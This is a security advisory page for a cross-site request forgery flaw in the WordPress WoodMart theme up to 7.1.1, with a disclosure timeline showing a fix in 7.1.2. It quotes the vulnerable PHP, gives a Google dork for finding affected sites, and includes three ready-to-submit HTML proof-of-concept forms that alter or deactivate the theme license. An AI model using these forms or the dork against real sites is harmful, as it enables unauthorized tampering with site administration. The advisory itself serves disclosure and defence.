---
title: WordPress WoodMart Theme 7.1.1 Cross Site Request Forgery
url: https://cxsecurity.com/issue/WLB-2023030004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-02
fetch_date: 2025-10-04T08:24:03.233153
---

# WordPress WoodMart Theme 7.1.1 Cross Site Request Forgery

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress WoodMart Theme 7.1.1 Cross Site Request Forgery** **2023.03.01**  Credit:  **[fearzzzz](https://cxsecurity.com/author/fearzzzz/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")**  **[**Dork:** inurl:/wp-content/themes/woodmart/](https://cxsecurity.com/dorks/)** | |

==== [ Z://USB-00\_RESEARCH/WORDPRESS/ ] ============================================= [ 2023 ] ==
Report Title: WordPress WoodMart Theme <= 7.1.1 - Theme License Options Change via CSRF
Google Dork: inurl:/wp-content/themes/woodmart/
Research Date: 2023-02-10
Researcher: FearZzZz [ https://fearzzzz.ru ]
Component Vendor: XTemos [ https://themeforest.net/user/xtemos ]
Vulnerable Version: <= 7.1.1
Component Link: https://themeforest.net/item/woodmart-woocommerce-wordpress-theme/20264492
CVSS Base Score: 5.4 (Medium)
CVSS Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L
OWASP Top 10: A01: 2021 – Broken Access Control
CWE: CWE-352
CVE: TBA
=================================================================================================
#### [ Description: ]
The WoodMart theme for WordPress is vulnerable to Cross-Site Request Forgery (CSRF) in versions up to, and including, v7.1.1, because of missing nonce validation on the 'process\_form' function. This vulnerability could allow an attacker to trick users into performing an action they didn't intend to perform under their current authentication.
#### [ Vulnerable Code: ]
File #0: ~/woodmart/inc/classes/License.php, lines: 134-143.
```
if ( isset( $\_POST['purchase-code-deactivate'] ) ) {
$this->deactivate();
$this->\_notices->add\_success( 'Theme license is successfully deactivated.' );
return;
}
if ( isset( $\_POST['woodmart-purchase-code'] ) && ( ! isset( $\_POST['agree\_stored'] ) || empty( $\_POST['agree\_stored'] ) ) ) {
$this->\_notices->add\_error( 'You must agree to store your purchase code and user data by xtemos.com' );
return;
}
```
#### [ Impact: ]
Impact of a CSRF vulnerability is related to the privileges of the target user. Depending on the nature of the action, an attacker might be able to change some data or gain full control over the user's account. If the compromised user has a privileged role (administrator, i.e.) within the application, then the attacker can gain full control over the application.
#### [ Proof-of-Concept: ]
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://fearzzzz.ru/wp-admin/admin.php?page=xts\_dashboard&tab=wizard&step=activation" method="POST">
<input type="hidden" name="purchase&#45;code" value="Z" />
<input type="hidden" name="agree&#95;stored" value="on" />
<input type="hidden" name="woodmart&#45;purchase&#45;code" value="Activate&#32;theme" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://fearzzzz.ru/wp-admin/admin.php?page=xts\_license" method="POST">
<input type="hidden" name="purchase&#45;code" value="Z" />
<input type="hidden" name="agree&#95;stored" value="on" />
<input type="hidden" name="woodmart&#45;purchase&#45;code" value="Activate&#32;theme" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://fearzzzz.ru/wp-admin/admin.php?page=xts\_license" method="POST">
<input type="hidden" name="purchase&#45;code&#45;deactivate" value="1" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```
#### [ Timeline: ]
2023.02.10 - Vulnerability has been discovered.
2023.02.13 - WoodMart Theme v7.1.0 released.
2023.02.14 - WoodMart Theme v7.1.1 released.
2023.02.14 - Vendor notified, received a quick response.
2023.02.14 - All the details was addressed to Envato and Patchstack. CVE ID requested.
2023.02.15 - WoodMart Theme v7.1.2 released, the vulnerability has been fixed.
#### [ Contacts: ]
Website: fearzzzz.ru
Email: fearzzzz@tutanota.com
Twitter: https://twitter.com/fear\_zzzz
Medium: https://fearzzzz.medium.com
GitHub: https://github.com/fearzzzz
YouTube: https://youtube.com/@fearzzzz
#### [ Notes: ]
Special thanks to Mikhail Kobzarev (https://t.me/mihdan | https://wp-digest.com) for providing the original theme files.
Additional greetings to Kailoon (ThemeForest Senior Reviewer, https://kailoon.com) and XTemos Studio (https://themeforest.net/user/xtemos) for the prompt response.
#### [ Disclaimer: ]
The information provided in this report is provided "as is" without warranty of any kind. FearZzZz disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall FearZzZz be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if FearZzZz have been advised of the possibility of such damages.
========================================================================== [ www.fearzzzz.ru ] ==

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top